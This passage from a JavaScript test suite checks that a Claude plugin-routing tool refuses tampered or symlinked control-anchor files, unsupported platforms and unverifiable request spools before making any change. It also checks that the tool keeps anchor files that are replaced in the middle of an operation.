  await initOperation({ root, harness: "all", claudeExec: runner });
  const original = journaledTransactionInternals.onStep;
  journaledTransactionInternals.onStep = async (name) => {
    if (name === "state:rename" || name === "recovery:files") {
      const error = new Error(`stop at ${name}`);
      error.injected = true;
      throw error;
    }
  };
  try {
    await uninstallOperation({ root, claudeExec: runner }).catch(() => {});
  } finally {
    journaledTransactionInternals.onStep = original;
  }
  const document = JSON.parse(await readFile(journalFile(root), "utf8"));
  assert.equal(document.kind, "removal");
  assert.equal(document.mode, "rollback");
  assert.equal(document.claude?.prior, "healthy");
  assert.equal(runner.state.plugins.length, 0, "Claude was detached before the interruption");
  assert.equal(runner.state.marketplaces.length, 0, "the marketplace was removed before the interruption");
}

const HOSTILE_ANCHOR_VARIANTS = [
  {
    label: "malformed JSON",
    message: /not valid JSON/,
    apply: (file, root) => writeFile(file, "{ not json", { mode: 0o600 }),
  },
  {
    label: "foreign root",
    message: /root does not own this control directory/,
    apply: (file, root) =>
      writeFile(file, `${JSON.stringify({ ...validAnchor(root), root: path.join(root, "elsewhere") })}\n`, {
        mode: 0o600,
      }),
  },
  {
    label: "wrong scope",
    message: /home does not own this control directory/,
    apply: (file, root) =>
      writeFile(file, `${JSON.stringify({ ...validAnchor(root), scope: "global" })}\n`, { mode: 0o600 }),
  },
  {
    label: "over-permissive mode",
    message: /owner-only/,
    apply: async (file, root) => {
      await writeFile(file, `${JSON.stringify(validAnchor(root))}\n`, { mode: 0o600 });
      await chmod(file, 0o644);
    },
  },
  {
    label: "foreign owner field",
    message: /owner must be skill-router/,
    apply: (file, root) =>
      writeFile(file, `${JSON.stringify({ ...validAnchor(root), owner: "attacker" })}\n`, { mode: 0o600 }),
  },
  {
    label: "symlinked anchor",
    message: /symbolic link/,
    apply: async (file, root) => {
      const target = path.join(root, "foreign-anchor.json");
      await writeFile(target, `${JSON.stringify(validAnchor(root))}\n`, { mode: 0o600 });
      await symlink(target, file);
    },
  },
  {
    label: "wrong type",
    message: /not a regular file/,
    apply: async (file) => {
      await mkdir(file);
    },
  },
];

/**
 * One hostile anchor attempt: snapshot, attempt the public mutation, then
 * prove the refusal changed nothing at all and that recovery never started.
 */
async function expectAnchorRefusal({ root, runner, variant, attempt }) {
  const before = await snapshotTransaction(root, runner);
  let recoveryStarts = 0;
  const original = journaledTransactionInternals.onStep;
  journaledTransactionInternals.onStep = async (name) => {
    if (name === "recovery:begin") recoveryStarts += 1;
  };
  let failure;
  try {
    failure = await attempt().then(
      () => null,
      (error) => error,
    );
  } finally {
    journaledTransactionInternals.onStep = original;
  }

  assert.ok(failure, `${variant.label}: the mutation is refused`);
  assert.ok(failure instanceof MutationLockError, `${variant.label}: a stable lock error, got ${failure?.name}`);
  assert.equal(failure.code, LOCK_ERROR_CODES.LOCK_FOREIGN, `${variant.label}: LOCK_FOREIGN, got ${failure?.code}`);
  assert.match(failure.message, variant.message, `${variant.label}: refusal names the anchor problem`);

  const after = await snapshotTransaction(root, runner);
  assert.deepEqual(after, before, `${variant.label}: canonical state, config, payloads, journal, anchor, Claude log, and artifacts are identical`);
  assert.equal(after.claudeMutations, before.claudeMutations, `${variant.label}: zero fake-Claude mutations`);
  assert.deepEqual(after.claudeLog, before.claudeLog, `${variant.label}: zero fake-Claude commands of any kind`);
  assert.equal(recoveryStarts, 0, `${variant.label}: recovery never starts before the anchor check`);
}

test("a pending managed journal refuses every hostile control anchor before recovery or any Claude call", async () => {
  await withRoot(async (root) => {
    const runner = createFakeClaudeRunner();
    await seedPendingManagedJournal(root, runner);
    const file = anchorFile(root);
    assert.ok(await exists(file), "seeding left its own anchor");
    const attempt = () => initOperation({ root, harness: "all", claudeExec: runner });

    for (const variant of HOSTILE_ANCHOR_VARIANTS) {
      await rm(file, { recursive: true, force: true });
      await variant.apply(file, root);
      await expectAnchorRefusal({ root, runner, variant, attempt });
    }
    // The pending journal itself was never consumed or rewritten.
    assert.equal(JSON.parse(await readFile(journalFile(root), "utf8")).kind, "managed");
  });
});

test("a pending removal journal refuses every hostile control anchor before recovery or any Claude call", async () => {
  await withRoot(async (root) => {
    const runner = createFakeClaudeRunner();
    await seedPendingRemovalJournal(root, runner);
    const file = anchorFile(root);
    assert.ok(await exists(file), "seeding left its own anchor");
    const attempt = () => uninstallOperation({ root, claudeExec: runner });

    for (const variant of HOSTILE_ANCHOR_VARIANTS) {
      await rm(file, { recursive: true, force: true });
      await variant.apply(file, root);
      await expectAnchorRefusal({ root, runner, variant, attempt });
    }
    // The pending removal journal is untouched: no re-registration happened.
    const document = JSON.parse(await readFile(journalFile(root), "utf8"));
    assert.equal(document.kind, "removal");
    assert.equal(document.claude?.desired, "absent");
    assert.equal(runner.state.plugins.length, 0, "recovery never re-registered the plugin");
  });
});

test("an absent anchor with a strictly bound pending journal is created before recovery and the mutation continues exactly once", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    await seedPendingJournal(root);
    assert.ok(await exists(anchorFile(root)), "seeding left its anchor");

    // Simulate an interrupted location whose journal is still strictly bound
    // to this root/scope/control directory, but whose anchor is gone.
    await rm(anchorFile(root), { force: true });
    assert.ok(await exists(journalFile(root)), "the pending journal survives without its anchor");

    let anchorPresentAtRecoveryStart = null;
    const original = journaledTransactionInternals.onStep;
    journaledTransactionInternals.onStep = async (name) => {
      if (name === "recovery:begin") anchorPresentAtRecoveryStart = await exists(anchorFile(root));
    };
    let init;
    try {
      init = await initOperation({ root });
    } finally {
      journaledTransactionInternals.onStep = original;
    }
    assert.equal(init.command, "init");

    assert.equal(anchorPresentAtRecoveryStart, true, "the proven anchor already exists when recovery begins");
    const anchor = await readControlAnchor(controlPaths({ root }), { scope: "project", root });
    assert.equal(anchor.owner, "skill-router", "the recreated anchor is exactly ours");
    assert.equal(anchor.root, root, "the recreated anchor records the proven root");
    assert.equal(anchor.scope, "project", "the recreated anchor records the proven scope");
    assert.equal(await exists(journalFile(root)), false, "auto-recovery consumed the pending journal");
    const entries = await readdir(root);
    assert.deepEqual(entries.filter((name) => name.includes(".stage-")), [], "no stale stage survives");
    assert.deepEqual(entries.filter((name) => name.includes(".backup-")), [], "no stale backup survives");
    assert.deepEqual(
      entries.filter((name) => name !== ".skill-router-control" && PAYLOAD_NAME.test(name)),
      [],
      "no payload survives",
    );

    // The mutation continued exactly once: a repeat is the same build.
    const again = await initOperation({ root });
    assert.equal(again.fingerprint, init.fingerprint, "the continued build ran exactly once");
    assert.deepEqual(await controlEntries(root), ["control.json"], "control data holds only the anchor");
  });
});

test("token routing establishes the spool under the held read lease, never before it", async () => {
  await withHome(async () => {
    await withRoot(async (root) => {
      await initOperation({ root });
      const spool = path.join(root, ".skill-router-requests");
      const token = "0123456789abcdef0123456789abcdef";
      const file = path.join(spool, `${token}.txt`);
      await writeFile(file, ROUTE_REQUEST, { mode: 0o600 });

      // The read lease is asserted after the operation runs, so the spool
      // setup and the consumption both happen while the lease is held.
      const routed = await routeFileOperation(token, { root });
      assert.equal(routed.command, "route");
      assert.equal(Object.hasOwn(routed, "request"), false, "the result carries no request field");
      assert.equal(JSON.stringify(routed).includes(token), false, "the result carries no token");
      assert.equal(await exists(file), false, "the request is consumed exactly once");
      assert.deepEqual((await readdir(spool)).filter((name) => name !== ".skill-router-spool"), [], "only the marker remains");

      // A spool that exists but is empty is re-validated under the same lease
      // rather than being recreated or duplicated.
      await writeFile(file, ROUTE_REQUEST, { mode: 0o600 });
      const again = await routeFileOperation(token, { root });
      assert.equal(again.command, "route");
      assert.equal(await exists(file), false);
      assert.deepEqual((await readdir(spool)).filter((name) => name !== ".skill-router-spool"), []);
    });
  });
});

/* ================================================================== *
 * Phase 14 - the runtime platform guard at the controlled boundary
 * ================================================================== */

test("an unsupported runtime platform refuses every controlled runner before any filesystem effect", async () => {
  await withRoot(async (root) => {
    const before = await digestTree(root);
    const ran = [];
    const caught = async (run) => {
      try {
        await run();
        return null;
      } catch (error) {
        return error;
      }
    };

    const original = platformInternals.platform;
    platformInternals.platform = () => "win32";
    try {
      // The guard is the first statement of each runner: even an option that
      // would fail later (an invalid lock timeout) loses to the refusal, which
      // proves the platform check precedes control-context resolution, the
      // lock, the journal, and every write.
      const mutation = await caught(() =>
        runControlledMutation({
          command: "init",
          options: { root, lockTimeout: "bogus" },
          operation: async () => ran.push("mutation"),
        }),
      );
      assert.equal(mutation?.code, PLATFORM_ERROR_CODE);

      const read = await caught(() =>
        runControlledRead({
          command: "route",
          options: { root, lockTimeout: "bogus" },
          operation: async () => ran.push("read"),
        }),
      );
      assert.equal(read?.code, PLATFORM_ERROR_CODE);

      const recovery = await caught(() => runRecoveryOperation({ options: { root, lockTimeout: "bogus" } }));
      assert.equal(recovery?.code, PLATFORM_ERROR_CODE);

      // Every public operation crosses the same boundary.
      for (const operation of [initOperation, scanOperation, checkOperation, recoverOperation, uninstallOperation]) {
        const error = await caught(() => operation({ root }));
        assert.equal(error?.code, PLATFORM_ERROR_CODE);
      }
      const routed = await caught(() => routeOperation("route anything", { root }));
      assert.equal(routed?.code, PLATFORM_ERROR_CODE);
      const routedFile = await caught(() => routeFileOperation("0123456789abcdef0123456789abcdef", { root }));
      assert.equal(routedFile?.code, PLATFORM_ERROR_CODE);

      assert.deepEqual(ran, [], "no controlled operation ever ran");
    } finally {
      platformInternals.platform = original;
    }

    assert.equal(platformInternals.platform(), process.platform, "the platform seam is restored");
    assert.deepEqual(await digestTree(root), before, "an unsupported runtime performs zero filesystem mutation");
    await assert.rejects(() => lstat(controlDirectory(root)), (error) => error.code === "ENOENT");
  });
});

/* ================================================================== *
 * Phase 14 / B5 - an unprovable request spool refuses before any
 * probe, journal, state, or harness mutation
 * ================================================================== */

test("B5: a weak request-spool directory refuses dry-run and real uninstall before any mutation", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const spool = path.join(root, ".skill-router-requests");
    assert.equal((await lstat(spool)).isDirectory(), true, "the install created the stable spool");
    const before = await digestTree(root);
    const caught = async (run) => {
      try {
        await run();
        return null;
      } catch (error) {
        return error;
      }
    };

    const { requestSpoolInternals } = await import("../src/requests.js");
    const realLstat = requestSpoolInternals.lstat;
    try {
      requestSpoolInternals.lstat = async (target) => {
        const stat = await realLstat(target);
        if (path.resolve(target) !== path.resolve(spool)) return stat;
        return Object.assign(Object.create(Object.getPrototypeOf(stat)), stat, { ino: 0 });
      };

      for (const dryRun of [true, false]) {
        const error = await caught(() => uninstallOperation({ root, dryRun }));
        assert.equal(
          error?.code,
          "REQUEST-IDENTITY-UNAVAILABLE",
          `uninstall (dryRun=${dryRun}) refuses the unprovable spool at its step-0 preflight`,
        );
        assert.deepEqual(await digestTree(root), before, "no state, config, or harness mutation happened");
        assert.equal(await exists(journalFile(root)), false, "no transaction journal was created");
      }

      // A dry-run init refuses at the same early preflight, before the OpenCode
      // shape probe or any planning side effect.
      const initError = await caught(() => initOperation({ root, dryRun: true }));
      assert.equal(initError?.code, "REQUEST-IDENTITY-UNAVAILABLE");
      assert.deepEqual(await digestTree(root), before, "the dry run mutated nothing");
    } finally {
      requestSpoolInternals.lstat = realLstat;
    }
  });
});

/* ================================================================== *
 * Phase 14 - a dropped anchor is attributed to this run's exact entry
 * ================================================================== */

/**
 * Runs a real mutation that creates the anchor, then fails before any journal.
 * `onFault` fires the moment the operation fails, so a test can scope its
 * injection window to the anchor drop that follows.
 */
async function failBeforeJournal(root, onFault) {
  const original = journaledTransactionInternals.onStep;
  journaledTransactionInternals.onStep = async (name) => {
    if (name === "plan") {
      if (onFault) await onFault();
      const error = new Error("stop before the journal exists");
      error.injected = true;
      throw error;
    }
  };
  try {
    await assert.rejects(() => initOperation({ root }), /stop before the journal exists/);
  } finally {
    journaledTransactionInternals.onStep = original;
  }
}

test("B1: an anchor replaced around its validation is preserved, never dropped", async () => {
  await withRoot(async (root) => {
    const anchor = anchorFile(root);
    const realLstat = durableFsInternals.lstat;
    // Only the anchor *drop* that follows the injected failure is counted:
    // its attribution observes the anchor exactly twice around the validation
    // read (observations 1 and 3), with the validation read at 2 and the
    // attributed durableUnlink at 4.
    let dropping = false;
    let observations = 0;
    durableFsInternals.lstat = async (target) => {
      if (dropping && path.resolve(target) === path.resolve(anchor)) {
        observations += 1;
        if (observations === 3) {
          // The replacement lands between the validation read and the
          // post-validation attribution: the attributed identity can no
          // longer match, so the anchor is preserved untouched.
          await rm(anchor, { force: true });
          await writeFile(anchor, "foreign-anchor\n", { mode: 0o600 });
        }
      }
      return realLstat(target);
    };
    try {
      await failBeforeJournal(root, () => {
        dropping = true;
      });
    } finally {
      durableFsInternals.lstat = realLstat;
    }

    assert.ok(observations >= 3, "the anchor was attributed around its validation");
    assert.equal(await readFile(anchor, "utf8"), "foreign-anchor\n", "the replacement anchor survives byte-identical");
    assert.equal((await lstat(anchor)).isFile(), true, "the foreign anchor is never dropped");
    assert.equal(await exists(journalFile(root)), false, "the run still failed before any journal");
  });
});

test("B1: an anchor replaced before the attributed durableUnlink survives and is never dropped", async () => {
  await withRoot(async (root) => {
    const anchor = anchorFile(root);
    const realLstat = durableFsInternals.lstat;
    // Scoped to the anchor drop: observation 3 is the post-validation
    // attribution, observation 4 is the attributed durableUnlink.
    let dropping = false;
    let observations = 0;
    durableFsInternals.lstat = async (target) => {
      const isAnchor = dropping && path.resolve(target) === path.resolve(anchor);
      if (isAnchor) observations += 1;
      const stat = await realLstat(target);
      if (isAnchor && observations === 3) {
        // The replacement lands after the attribution observation and before
        // the attributed durableUnlink: its first observation no longer
        // matches the attributed identity, so nothing is renamed, claimed, or
        // unlinked and the replacement survives.
        await rm(anchor, { force: true });
        await writeFile(anchor, "foreign-anchor\n", { mode: 0o600 });
      }
      return stat;
    };
    try {
      await failBeforeJournal(root, () => {
        dropping = true;
      });
    } finally {
      durableFsInternals.lstat = realLstat;
    }

    assert.ok(observations >= 3, "the attribution completed before the replacement");
    assert.equal(await readFile(anchor, "utf8"), "foreign-anchor\n", "the replacement anchor survives byte-identical");
    assert.equal((await lstat(anchor)).isFile(), true, "the foreign anchor is never dropped");
    assert.deepEqual(await readdir(controlDirectory(root)).then((names) => names.includes("transaction.json")), false, "no journal was created");
  });
});

/* ================================================================== *
 * Phase 14 / R1 - created control directories are preserved, never
 * removed by inference
 * ================================================================== */

test("R1: a control directory this run created is preserved, empty and inert", async () => {
  await withRoot(async (root) => {
    await failBeforeJournal(root);
    const controlDir = controlDirectory(root);
    assert.equal((await lstat(controlDir)).isDirectory(), true, "the created control directory is preserved");
    assert.deepEqual(
      await readdir(controlDir),
      [],
      "only the attributed anchor drop may touch control data; the directory itself survives",
    );
    if (process.platform !== "win32") {
      assert.equal((await lstat(controlDir)).mode & 0o777, 0o700, "it stays owner-private");
    }
  });
});

test("R1: a replacement control directory planted during a failed run survives untouched", async () => {
  await withRoot(async (root) => {
    const controlDir = controlDirectory(root);
    // A replacement lands mid-run: with no automatic control-directory
    // removal there is nothing that could delete it, and the attributed
    // anchor drop only ever touches control.json itself.
    await failBeforeJournal(root, async () => {
      await writeFile(path.join(controlDir, "intruder.txt"), "survives", { mode: 0o600 });
    });
    assert.equal(await exists(controlDir), true, "the control directory survives");
    assert.equal(await exists(anchorFile(root)), false, "the anchor this run created is still dropped");
    assert.equal(
      await readFile(path.join(controlDir, "intruder.txt"), "utf8"),
      "survives",
      "the planted entry survives untouched",
    );
  });
});
